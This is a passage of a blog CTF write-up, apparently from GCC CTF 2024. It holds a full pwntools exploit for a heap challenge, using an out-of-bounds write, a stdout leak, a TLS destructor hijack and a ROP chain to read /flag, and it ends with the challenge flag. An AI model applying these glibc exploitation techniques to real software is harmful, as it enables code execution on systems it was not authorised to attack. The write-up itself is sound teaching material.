+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;flag_roulette_patched&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">ld</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ld-linux-x86-64.so.2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">exe</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;wezterm&#39;</span><span class="p">,</span> <span class="s1">&#39;cli&#39;</span><span class="p">,</span> <span class="s1">&#39;split-pane&#39;</span><span class="p">,</span> <span class="s1">&#39;--top&#39;</span><span class="p">,</span> <span class="s1">&#39;--percent&#39;</span><span class="p">,</span> <span class="s1">&#39;70&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">remote_url</span> <span class="o">=</span> <span class="s2">&#34;worker01.gcc-ctf.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">remote_port</span> <span class="o">=</span> <span class="mi">10873</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">b malloc.c:3352
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;b *__call_tls_dtors&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">PLT_DEBUG</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pause</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_url</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">demangle</span><span class="p">(</span><span class="n">val</span><span class="p">,</span> <span class="n">is_heap_base</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">is_heap_base</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mask</span> <span class="o">=</span> <span class="mh">0xfff</span> <span class="o">&lt;&lt;</span> <span class="mi">52</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">mask</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">v</span> <span class="o">=</span> <span class="n">val</span> <span class="o">&amp;</span> <span class="n">mask</span>
+</span></span><span class="line"><span class="cl">            <span class="n">val</span> <span class="o">^=</span> <span class="p">(</span><span class="n">v</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">mask</span> <span class="o">&gt;&gt;=</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">val</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">val</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mangle</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="n">heap_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">val</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">menu_delim</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">logleak</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>  <span class="n">info</span><span class="p">(</span><span class="n">name</span><span class="o">+</span><span class="s1">&#39; = </span><span class="si">%#x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sa</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sla</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">line</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">delim</span><span class="p">,</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sl</span><span class="p">(</span><span class="n">line</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">so</span><span class="p">(</span><span class="n">data</span><span class="p">):</span> <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sn</span><span class="p">(</span><span class="n">num</span><span class="p">):</span> <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">menu</span><span class="p">(</span><span class="n">num</span><span class="p">):</span> <span class="k">return</span> <span class="n">sla</span><span class="p">(</span><span class="n">menu_delim</span><span class="p">,</span> <span class="n">sn</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">place</span><span class="p">(</span><span class="n">sz</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">sn</span><span class="p">(</span><span class="n">sz</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">sn</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">sn</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">win</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">menu</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Default mp_.mmap_threshold is 0x20000</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Calling malloc(0x21000) will trigger mmap</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># With the OOB relative write, we can overwrite mp_.no_dyn_threshold to 0x1</span>
+</span></span><span class="line"><span class="cl"><span class="n">place</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span> <span class="mh">0x1f8398</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Due to we overwrite mp_.no_dyn_threshold, free won&#39;t overwrite mp_.mmap_threshold to the current freed chunk size.</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, everytime we call malloc(0x21000), the nb always larger than the mmap_threshold (which is remains 0x20000 due to previous overwrite).</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># So now, we can always trigger mmap via malloc :)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># With the OOB relative write from the mmapped address (which placed before tls and libc area),</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># we basically has unlimited one byte overwrite (with limit that the offset is unsigned int).</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rel_write</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">place</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">rel_write_8</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rel_write</span><span class="p">(</span><span class="n">offset</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">val</span><span class="p">)[</span><span class="n">i</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">LIBC LEAK
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite stdout to get leak</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite flags to 0x1800</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write</span><span class="p">(</span><span class="mh">0x1f9770</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write</span><span class="p">(</span><span class="mh">0x1f9771</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write</span><span class="p">(</span><span class="mh">0x1f9772</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write</span><span class="p">(</span><span class="mh">0x1f9773</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite _IO_write_ptr last byte to 0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">place</span><span class="p">(</span><span class="mh">0x21000</span><span class="p">,</span> <span class="mh">0x1f9798</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># After overwriting, the next puts() will print data from _IO_write_base _IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (which contains _IO_stdfile_1_lock address)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;leaked_libc&#39;</span><span class="p">,</span> <span class="n">leaked_libc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span>  <span class="n">leaked_libc</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_stdfile_1_lock&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;libc.address&#39;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">STACK PIVOT via TLS DTOR
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite mangle pointer to 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">tls_base</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">-</span><span class="mh">0x28c0</span>
+</span></span><span class="line"><span class="cl"><span class="n">tls_base_offset</span> <span class="o">=</span> <span class="mh">0x22730</span>
+</span></span><span class="line"><span class="cl"><span class="n">logleak</span><span class="p">(</span><span class="s1">&#39;tls_base&#39;</span><span class="p">,</span> <span class="n">tls_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write_8</span><span class="p">(</span><span class="n">tls_base_offset</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write</span><span class="p">(</span><span class="n">tls_base_offset</span><span class="o">+</span><span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span> <span class="c1"># I don&#39;t know why...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Write /flag</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing /flag...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_pos</span> <span class="o">=</span> <span class="n">tls_base</span><span class="o">+</span><span class="mh">0x50</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag_off</span> <span class="o">=</span> <span class="n">tls_base_offset</span><span class="o">+</span><span class="mh">0x50</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write_8</span><span class="p">(</span><span class="n">flag_off</span><span class="p">,</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/flag</span><span class="se">\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite tls_dtor_list with tls_base+0x60</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing tls_dtor_list...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tls_dtor_list</span> <span class="o">=</span> <span class="n">tls_base</span><span class="o">-</span><span class="mh">0x50</span>
+</span></span><span class="line"><span class="cl"><span class="n">tls_dtor_list_off</span> <span class="o">=</span> <span class="n">tls_base_offset</span><span class="o">-</span><span class="mh">0x50</span>
+</span></span><span class="line"><span class="cl"><span class="n">curr_dtor</span> <span class="o">=</span> <span class="n">tls_base</span><span class="o">+</span><span class="mh">0x60</span> <span class="c1"># rbx</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write_8</span><span class="p">(</span><span class="n">tls_dtor_list_off</span><span class="p">,</span> <span class="n">curr_dtor</span><span class="p">)</span> <span class="c1"># First entry of dtor_list</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite dtor with pivot stack gadget</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing pivot_stack_gadget...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pivot_stack_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x00099ab4</span> <span class="c1"># mov rbp, [rsi+8]; mov rax, [rbx+0x40]; test byte ptr [rbx+0x50], 1; jne short 0x99a98; mov rdi, rsi; call rax;</span>
+</span></span><span class="line"><span class="cl"><span class="n">curr_dtor_off</span> <span class="o">=</span> <span class="n">tls_base_offset</span><span class="o">+</span><span class="mh">0x60</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write_8</span><span class="p">(</span><span class="n">curr_dtor_off</span><span class="p">,</span> <span class="n">pivot_stack_gadget</span><span class="o">&lt;&lt;</span><span class="mi">17</span><span class="p">)</span> <span class="c1"># func</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Observation in gdb, rsi pointing to __exit_funcs</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite __exit_funcs+0x8 ([rsi+0x8]) with target rbp</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing __exit_funcs+0x8...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write_8</span><span class="p">(</span><span class="mh">0x1f8838</span><span class="p">,</span> <span class="n">tls_base</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite [rbx+0x40] (which is curr_dtor+0x40) with leave</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing curr_dtor+0x40...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x00141a03</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write_8</span><span class="p">(</span><span class="n">curr_dtor_off</span><span class="o">+</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">leave_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite [rbx+0x50] with 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing curr_dtor+0x50...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_write</span><span class="p">(</span><span class="n">curr_dtor_off</span><span class="o">+</span><span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Fill in ROP open read write starting from rbp+0x8 (tls_base+0x108)</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Writing ROPChain...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0017964f</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0014f520</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x000fd76d</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x00121f57</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x0013fcf4</span>
+</span></span><span class="line"><span class="cl"><span class="n">xchg_rdi_rax</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mh">0x00169b4d</span>
+</span></span><span class="line"><span class="cl"><span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># open(&#34;flag.txt&#34;, 0, 0)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag_pos</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdx</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rax</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">syscall</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># read(3, flag_pos, 0x100)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">xchg_rdi_rax</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rsi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag_pos</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdx</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x100</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">read</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># puts(flag_pos)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pop_rdi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag_pos</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop_off</span> <span class="o">=</span> <span class="n">tls_base_offset</span><span class="o">+</span><span class="mh">0x108</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">ropchain</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rel_write_8</span><span class="p">(</span><span class="n">rop_off</span><span class="o">+</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">),</span> <span class="n">num</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">EXIT AND WIN
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Win...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">place</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># Place random bet</span>
+</span></span><span class="line"><span class="cl"><span class="n">win</span><span class="p">()</span> <span class="c1"># exit :)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><strong>Flag: GCC{Th0s3_p0in7S_R_w3lL_deS3rvEd_Gig4ch4d}</strong></p>
+</blockquote>
+<h1 id="social-media">Social Media</h1>
+<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/gcc-ctf-2024/" data-title="GCC CTF 2024" data-via="Chovid99" data-hashtags="Writeup,GCC CTF,heap,mmap,tls dtor,2024"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/gcc-ctf-2024/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/gcc-ctf/">GCC CTF</a>,&nbsp;<a href="/tags/heap/">Heap</a>,&nbsp;<a href="/tags/mmap/">Mmap</a>,&nbsp;<a href="/tags/tls-dtor/">Tls Dtor</a>,&nbsp;<a href="/tags/2024/">2024</a></section>
+        <section>
+            
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/dicectf-2024-quals/" class="prev" rel="prev" title="DiceCTF 2024 Quals"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>DiceCTF 2024 Quals</a>
+            <a href="/posts/cyber-apocalypse-2024-pwn/" class="next" rel="next" title="Cyber Apocalypse 2024: Pwn">Cyber Apocalypse 2024: Pwn<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
